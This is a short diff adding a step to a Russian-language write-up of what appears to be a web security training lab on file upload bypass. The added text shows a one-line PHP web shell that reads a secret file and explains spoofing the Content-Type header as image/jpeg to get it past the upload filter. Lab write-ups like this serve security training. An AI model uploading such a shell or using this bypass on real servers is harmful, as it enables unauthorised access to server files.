@@ -22,3 +22,6 @@
 
 ## 3. Ход решения
 
+Я перехватил запрос загрузки `shell.php`, который я использовал в предыдущей лабораторной: `<?php echo file_get_contents('/home/carlos/secret/'); ?>`. После перехвата я изменил `Content-Type` с `application/x-php` на `image/jpeg`:
+
+![Решения](images/Screenshot_2026-10-25_21_02_57.png)
